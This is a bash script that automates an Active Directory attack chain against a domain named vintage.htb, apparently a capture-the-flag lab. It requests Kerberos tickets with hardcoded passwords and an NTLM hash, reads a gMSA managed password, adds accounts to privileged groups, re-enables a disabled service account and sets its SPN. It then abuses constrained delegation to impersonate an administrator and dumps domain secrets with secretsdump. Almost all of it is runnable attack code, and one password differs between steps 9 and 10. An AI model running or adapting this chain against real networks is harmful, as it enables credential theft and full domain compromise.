#!/bin/bash

# Define colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to print a header for each step
print_header() {
    echo -e "${YELLOW}======================================================================${NC}"
    echo -e "${YELLOW}$1${NC}"
    echo -e "${YELLOW}======================================================================${NC}"
}

# Function to print a success message
print_success() {
    echo -e "${GREEN}[+] Success: $1${NC}"
}

# Function to print an error message and exit
print_error() {
    echo -e "${RED}[-] Error: $1${NC}"
    exit 1
}

# Function to run bloodyAD commands
run_bloodyAD() {
    echo -e "${BLUE}[*] Running: bloodyAD $@${NC}"
    bloodyAD "$@"
    if [ $? -ne 0 ]; then
        print_error "Command failed - bloodyAD $@"
    fi
}

# Step 0: Get TGT for FS01$
print_header "Step 0: Getting TGT for FS01$"
getTGT.py vintage.htb/'FS01$':'fs01'
if [ $? -ne 0 ]; then
    print_error "getTGT.py failed for FS01$"
fi
export KRB5CCNAME=FS01$.ccache
print_success "TGT for FS01$ obtained and KRB5CCNAME set."
echo

# Step 1: Get managed password for GMSA01$
print_header "Step 1: Getting managed password for GMSA01$"
run_bloodyAD --host dc01.vintage.htb --domain "vintage.htb" --dc-ip 10.10.11.45 -k get object 'GMSA01$' --attr msDS-ManagedPassword
print_success "Managed password for GMSA01$ retrieved."
echo

# Step 2: Get TGT for GMSA01$
print_header "Step 2: Getting TGT for GMSA01$"
getTGT.py vintage.htb/'GMSA01$' -hashes aad3b435b51404eeaad3b435b51404ee:7dc430b95e17ed6f817f69366f35be06
if [ $? -ne 0 ]; then
    print_error "getTGT.py failed for GMSA01$"
fi
export KRB5CCNAME=GMSA01$.ccache
print_success "TGT for GMSA01$ obtained and KRB5CCNAME set."
echo

# Step 3: Add P.Rosa to SERVICEMANAGERS group
print_header "Step 3: Adding P.Rosa to SERVICEMANAGERS group"
run_bloodyAD --host dc01.vintage.htb --domain vintage.htb --dc-ip 10.10.11.45 -k add groupMember "SERVICEMANAGERS" "P.Rosa"
print_success "P.Rosa added to SERVICEMANAGERS group."
echo

# Step 4: Get TGT for P.Rosa
print_header "Step 4: Getting TGT for P.Rosa"
getTGT.py vintage.htb/'P.Rosa':'Rosaisbest123'
if [ $? -ne 0 ]; then
    print_error "getTGT.py failed for P.Rosa"
fi
export KRB5CCNAME=P.Rosa.ccache
print_success "TGT for P.Rosa obtained and KRB5CCNAME set."
echo

# Step 5: Enabling SVC_SQL account by Removing ACCOUNTDISABLE flag  
print_header "Step 5: Removing ACCOUNTDISABLE flag from SVC_SQL"
run_bloodyAD --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k remove uac SVC_SQL -f ACCOUNTDISABLE
print_success "ACCOUNTDISABLE flag removed from SVC_SQL."
echo

# Step 6: Set servicePrincipalName for SVC_SQL
print_header "Step 6: Setting servicePrincipalName for SVC_SQL"
run_bloodyAD --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k set object 'SVC_SQL' servicePrincipalName -v 'cifs/sql'
print_success "servicePrincipalName set for SVC_SQL."
echo

# Step 7: Get TGT for c.neri_adm
print_header "Step 7: Getting TGT for c.neri_adm"
getTGT.py vintage.htb/'c.neri_adm':'Uncr4ck4bl3P4ssW0rd0312'
if [ $? -ne 0 ]; then
    print_error "getTGT.py failed for c.neri_adm"
fi
export KRB5CCNAME=c.neri_adm.ccache
print_success "TGT for c.neri_adm obtained and KRB5CCNAME set."
echo

# Step 8: Add SVC_SQL to DELEGATEDADMINS group
print_header "Step 8: Adding SVC_SQL to DELEGATEDADMINS group"
run_bloodyAD --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k add groupMember "DELEGATEDADMINS" "SVC_SQL"
print_success "SVC_SQL added to DELEGATEDADMINS group."
echo

# Step 9: Get TGT for svc_sql
print_header "Step 9: Getting TGT for svc_sql"
getTGT.py 'vintage.htb/svc_sql:Zer0the0ne'
if [ $? -ne 0 ]; then
    print_error "getTGT.py failed for svc_sql"
fi
export KRB5CCNAME=svc_sql.ccache
print_success "TGT for svc_sql obtained and KRB5CCNAME set."
echo

# Step 10: Get Service Ticket for L.BIANCHI_ADM
print_header "Step 10: Getting Service Ticket for L.BIANCHI_ADM"
getST.py -dc-ip 10.10.11.45 -spn 'cifs/dc01.vintage.htb' -impersonate L.BIANCHI_ADM -k 'vintage.htb/svc_sql:Zer0the0n'
if [ $? -ne 0 ]; then
    print_error "getST.py failed for L.BIANCHI_ADM"
fi
export KRB5CCNAME=L.BIANCHI_ADM.ccache
print_success "Service Ticket for L.BIANCHI_ADM obtained and KRB5CCNAME set."
echo

# Step 11: Dump secrets using impacket-secretsdump
print_header "Step 11: Dumping secrets using impacket-secretsdump"
secretsdump.py -k dc01.vintage.htb
if [ $? -ne 0 ]; then
    print_error "impacket-secretsdump failed"
fi
print_success "Secrets dumped successfully."
echo

echo -e "${GREEN}All commands executed successfully!${NC}"
